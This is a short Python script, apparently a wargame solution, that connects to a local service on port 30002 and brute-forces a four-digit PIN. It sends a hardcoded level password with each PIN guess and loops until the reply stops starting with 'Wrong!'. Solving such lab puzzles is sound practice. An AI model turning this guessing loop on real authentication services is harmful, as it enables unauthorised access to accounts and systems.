import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 30002))

dados = s.recv(2048)
print(dados)
senha = 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ'
pincode = '0000'
enter = '\n'
trancode = senha + ' ' + pincode + enter
s.send(trancode)
print(trancode)
dados = s.recv(2048)
print(dados)

while dados[0:6] == 'Wrong!':
  x = int(pincode)
  x += 1
  pincode = str('%04d' % x)
  trancode = senha + ' ' + pincode + enter
  s.send(trancode)
  print(trancode)
  dados = s.recv(2048)
  print(dados)
